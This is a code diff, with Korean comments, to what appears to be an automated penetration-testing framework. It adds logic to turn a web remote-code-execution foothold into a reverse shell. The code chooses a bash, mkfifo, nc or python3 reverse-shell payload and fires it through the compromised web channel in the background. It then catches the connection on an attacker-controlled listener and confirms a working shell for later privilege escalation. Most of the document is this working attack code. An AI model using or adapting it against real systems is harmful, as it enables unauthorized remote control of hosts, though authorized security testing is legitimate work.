@@ -185,7 +185,12 @@ class FootholdMixin:
         if self.world.web_product:
             ws = self._acquire_web_rce(report, looks_like_shell, verify_probe_command)
             if ws is not None:
-                return ws
+                # 웹 RCE 확보 시, opt-in(catch_revshell) + 공격자 IP 가 있으면 '리버스셸 업그레이드'
+                # 를 시도한다 — 웹셸로 리버스셸 payload 를 쏘고(nc 리스너로 수신), 성립하면 더
+                # 안정적인 셸 세션을 우선한다(privesc 열거에 유리). 실패하면 웹 세션 유지(무손실).
+                upgraded = self._maybe_upgrade_revshell(report, ws,
+                                                        looks_like_shell, verify_probe_command)
+                return upgraded if upgraded is not None else ws
         # (2) 리버스셸 수신 분기 — opt-in(catch_revshell) + 준비된 revshell(lhost/lport) 있을 때
         return self._acquire_reverse_shell(report, looks_like_shell, verify_probe_command)
 
@@ -267,3 +272,99 @@ class FootholdMixin:
             return session
         session.close()
         return None
+
+    # ── 리버스셸 업그레이드(웹 RCE → nc 수신 셸) ─────────────────────────────
+    def _pick_revshell_payload(self, report) -> str:
+        """준비된 리버스셸 payload(report.revshells = revshell.generate)에서 '한 줄'을 고른다.
+        TTY 없는 웹셸에서 가장 잘 도는 순서로 선호(bash 계열 → mkfifo → python3). 없으면 ''."""
+        shells = getattr(report, "revshells", None) or []
+        by_name = {getattr(s, "name", ""): getattr(s, "payload", "") for s in shells}
+        for n in ("bash 5", "bash -i", "sh mkfifo", "nc mkfifo", "python3", "perl"):
+            if by_name.get(n):
+                return by_name[n]
+        return (getattr(shells[0], "payload", "") if shells else "")
+
+    def _fire_web_payload(self, web_session, payload: str) -> None:
+        """웹 RCE 채널로 리버스셸 트리거를 '쏜다'(fire-and-forget, 백그라운드 스레드).
+        payload 를 백그라운드·세션분리로 감싸 HTTP 요청이 셸에 매달리지 않게 한다. 실패는 삼킨다
+        (성립 판정은 리스너 수신이 담당). WebRceSession.fire 가 요청 오류를 degrade 처리한다."""
+        import shlex
+        import threading
+        # setsid + 백그라운드 + 입출력 분리 → PHP system() 류가 자식에 매달리지 않고 즉시 반환.
+        bg = f"setsid sh -c {shlex.quote(payload)} >/dev/null 2>&1 &"
+        fire = getattr(web_session, "fire", None)
+        if fire is None:
+            return
+
+        def _send():
+            try:
+                fire(bg)
+            except Exception as e:   # noqa: BLE001 — fire-and-forget
+                self.audit.event("revshell_fire_error", error=f"{type(e).__name__}: {e}")
+
+        threading.Thread(target=_send, daemon=True).start()
+
+    def _maybe_upgrade_revshell(self, report, web_session, looks_like_shell, verify_probe_command):
+        """웹 RCE 발판을 리버스셸로 '업그레이드'한다(opt-in·공격자 IP 필요). 리스너를 백그라운드로
+        띄우고 웹셸로 payload 를 쏜 뒤 콜백을 수신한다. 성립검증 통과분만 인정하고, 성공 시 웹
+        세션을 닫고 리버스셸 세션을 반환(더 안정적). 어떤 단계든 실패하면 None(→ 웹 세션 유지, 무손실).
+        한 세션 1회만 시도(재진입 가드). 전부 opt-in(catch_revshell) + 준비된 revshell 하에서만."""
+        if not getattr(self, "catch_revshell", False):
+            return None
+        if getattr(self, "_revshell_upgraded", False):
+            return None
+        lhost = getattr(report, "revshell_lhost", "") or ""
+        lport = getattr(report, "revshell_lport", 0) or getattr(self, "revshell_port", 0)
+        if not lhost or not lport:
+            return None
+        payload = self._pick_revshell_payload(report)
+        if not payload:
+            return None
+        catch = getattr(self, "_revshell_catcher", None)   # 테스트 주입용(기본은 실제 소켓)
+        if catch is None:
+            try:
+                from .shell_transport import catch_reverse_shell as catch
+            except ImportError as e:
+                self.audit.event("foothold_skip", reason="revshell_transport_unavailable",
+                                 detail=str(e))
+                return None
+        self._revshell_upgraded = True
+        import threading
+        import time
+        result: dict = {}
+
+        def _listen():
+            try:
+                result["sess"] = catch(lhost, int(lport))
+            except OSError as e:
+                result["err"] = e
+
+        th = threading.Thread(target=_listen, daemon=True)
+        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport), via="web-upgrade")
+        th.start()
+        # 리스너가 bind/accept 준비할 짧은 여유(테스트는 0). 그 뒤 트리거 발사.
+        time.sleep(getattr(self, "_revshell_prefire_delay", 0.5))
+        self._fire_web_payload(web_session, payload)
+        th.join(timeout=getattr(self, "_revshell_join_timeout", 125))
+        session = result.get("sess")
+        if session is None:
+            return None
+        # 성립 검증: 콜백이 와도 실제 셸 신호가 없으면 폐기(거짓 발판 방지). 소켓 I/O 오류도 degrade.
+        try:
+            ok = bool(session.alive and looks_like_shell(session.run(verify_probe_command())))
+        except OSError as e:
+            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
+            session.close()
+            return None
+        if not ok:
+            session.close()
+            return None
+        self.audit.event("revshell_upgrade", lhost=lhost, lport=int(lport))
+        report.manual_suggestions.append(
+            f"# 웹 RCE → 리버스셸 업그레이드 성립 — nc 리스너({lhost}:{lport}) 수신 셸 확보. "
+            f"이후 명령·privesc 열거는 리버스셸 세션으로 진행(더 안정적).")
+        try:
+            web_session.close()
+        except Exception:   # noqa: BLE001 — 업그레이드 성공이 웹 세션 close 예외로 깨지지 않게
+            pass
+        return session
